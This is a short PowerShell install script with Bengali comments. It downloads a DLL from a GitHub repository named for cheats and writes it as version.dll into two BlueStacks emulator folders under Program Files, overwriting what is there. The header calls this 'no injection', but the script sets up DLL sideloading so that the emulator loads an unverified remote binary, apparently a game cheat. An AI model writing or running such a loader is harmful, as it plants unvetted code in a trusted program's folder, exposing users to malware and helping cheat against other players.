# install_version.ps1
# Downloads version.dll directly to target folders (no temp, no injection)

$ErrorActionPreference = "Stop"

# ---- কনফিগ ----
$dllUrl = "https://raw.githubusercontent.com/crazyxcheats/Bios/main/dinput8.dll"
$destinationPaths = @(
    "C:\Program Files\BlueStacks_nxt\version.dll",
    "C:\Program Files\BlueStacks_msi5\version.dll"
)

# ---- ডাউনলোড করো (মেমরিতে) ----
try {
    Write-Host "📥 Downloading DLL from $dllUrl ..." -ForegroundColor Cyan
    $webClient = New-Object System.Net.WebClient
    $dllBytes = $webClient.DownloadData($dllUrl)
    Write-Host "✅ Download successful ($($dllBytes.Length) bytes)." -ForegroundColor Green
} catch {
    Write-Host "❌ Failed to download DLL: $_" -ForegroundColor Red
    exit 1
}

# ---- প্রতিটি ডেস্টিনেশন ফোল্ডার চেক ও রাইট ----
$anySuccess = $false
foreach ($dest in $destinationPaths) {
    $dir = Split-Path $dest -Parent
    if (-not (Test-Path $dir)) {
        Write-Host "❌ Directory not found: $dir → Skipping" -ForegroundColor Red
        continue
    }

    try {
        # ফাইল রাইট করো (ওভাররাইট করবে)
        [System.IO.File]::WriteAllBytes($dest, $dllBytes)
        Write-Host "✅ Written to: $dest" -ForegroundColor Green
        $anySuccess = $true
    } catch {
        Write-Host "❌ Failed to write to $dest : $_" -ForegroundColor Red
    }
}

# ---- ফাইনাল স্ট্যাটাস ----
if ($anySuccess) {
    Write-Host "🎉 DLL deployed successfully to at least one folder." -ForegroundColor Green
    exit 0
} else {
    Write-Host "❌ No valid destination folders found. DLL was not deployed." -ForegroundColor Red
    exit 1
}
